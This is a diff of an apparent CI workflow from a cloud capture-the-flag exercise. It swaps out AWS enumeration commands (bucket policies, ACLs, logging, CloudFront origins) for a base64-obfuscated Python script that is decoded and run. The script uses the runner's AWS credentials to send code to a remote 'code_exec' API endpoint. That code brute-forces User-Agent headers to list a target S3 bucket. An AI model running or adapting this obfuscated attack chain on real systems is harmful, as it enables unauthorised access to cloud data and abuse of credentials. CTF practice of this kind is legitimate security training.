@@ -21,24 +21,12 @@ jobs:
       - name: Fetch docs.html
         run: curl -s https://d4ysu55xg7wfi.cloudfront.net/docs.html
         
-      - name: Enumerate with ctf_participant_role
+      - name: Try UserAgents from Lambda
         run: |
-          echo "=== bucket policy ==="
-          aws s3api get-bucket-policy --bucket userad88e2b168aa387e 2>&1 || true
+          pip install requests requests-aws4auth --quiet
 
-          echo "=== bucket logging ==="
-          aws s3api get-bucket-logging --bucket userad88e2b168aa387e 2>&1 || true
-
-          echo "=== cloudfront distributions ==="
-          aws cloudfront list-distributions \
-            --query 'DistributionList.Items[].{Domain:DomainName,Origins:Origins.Items[].{Domain:DomainName,Headers:CustomHeaders.Items}}' \
-            --output json 2>&1 || true
-
-          echo "=== list buckets ==="
-          aws s3api list-buckets 2>&1 || true
-
-          echo "=== logad bucket logging ==="
-          aws s3api get-bucket-logging --bucket logad88e2b168aa387e 2>&1 || true
-
-          echo "=== userad bucket acl ==="
-          aws s3api get-bucket-acl --bucket userad88e2b168aa387e 2>&1 || true
+      - name: Brute UserAgent from Lambda
+        run: |
+          pip install requests requests-aws4auth --quiet
+          B64='aW1wb3J0IGJvdG8zLCBiYXNlNjQsIHJlcXVlc3RzCmZyb20gcmVxdWVzdHNfYXdzNGF1dGggaW1wb3J0IEFXUzRBdXRoCgpBUEkgPSAnaHR0cHM6Ly9sOHNzeWF6NjlmLmV4ZWN1dGUtYXBpLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tL2Rldi9jb2RlX2V4ZWMnCmNyZWRzID0gYm90bzMuU2Vzc2lvbigpLmdldF9jcmVkZW50aWFscygpLmdldF9mcm96ZW5fY3JlZGVudGlhbHMoKQphdXRoID0gQVdTNEF1dGgoY3JlZHMuYWNjZXNzX2tleSwgY3JlZHMuc2VjcmV0X2tleSwgJ3VzLWVhc3QtMScsICdleGVjdXRlLWFwaScsIHNlc3Npb25fdG9rZW49Y3JlZHMudG9rZW4pCgpjb2RlID0gImltcG9ydCB1cmxsaWIucmVxdWVzdCwgdXJsbGliLmVycm9yXG5cbkJVQ0tFVCA9ICd1c2VyYWQ4OGUyYjE2OGFhMzg3ZSdcblVSTCA9ICdodHRwczovLycgKyBCVUNLRVQgKyAnLnMzLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tLz9saXN0LXR5cGU9MidcblxuYWdlbnRzID0gW1xuICAgICdqdW5pb3JfZGV2ZWxvcGVyJyxcbiAgICAnanVuaW9yLWRldmVsb3BlcicsXG4gICAgJ0p1bmlvckRldmVsb3BlcicsXG4gICAgJ2RldmVsb3BlcicsXG4gICAgJ2FkbWluJyxcbiAgICAnQW1hem9uIENsb3VkRnJvbnQnLFxuICAgICdpbnRlcm5hbCcsXG4gICAgJ2Nsb3VkLWVzY2FwZScsXG4gICAgJ2N0Zi1hZ2VudCcsXG5dXG5cbmZvciBpLCB1YSBpbiBlbnVtZXJhdGUoYWdlbnRzKTpcbiAgICB0cnk6XG4gICAgICAgIHJlcSA9IHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QoVVJMLCBoZWFkZXJzPXsnVXNlci1BZ2VudCc6IHVhfSlcbiAgICAgICAgciA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLCB0aW1lb3V0PTUpXG4gICAgICAgIHJhaXNlIFN5c3RlbUV4aXQoaSArIDEwKVxuICAgIGV4Y2VwdCB1cmxsaWIuZXJyb3IuSFRUUEVycm9yIGFzIGU6XG4gICAgICAgIGlmIGUuY29kZSA8IDQwMDpcbiAgICAgICAgICAgIHJhaXNlIFN5c3RlbUV4aXQoaSArIDEwKVxuICAgIGV4Y2VwdCBFeGNlcHRpb246XG4gICAgICAgIHBhc3NcblxucmFpc2UgU3lzdGVtRXhpdCgwKVxuIgpyID0gcmVxdWVzdHMucG9zdChBUEksIGpzb249eydjb2RlJzogYmFzZTY0LmI2NGVuY29kZShjb2RlLmVuY29kZSgpKS5kZWNvZGUoKX0sIGF1dGg9YXV0aCkKcHJpbnQoci5zdGF0dXNfY29kZSwgci5qc29uKCkpCg=='
+          printf '%s' "$B64" | base64 -d > /tmp/ua.py && python3 /tmp/ua.py
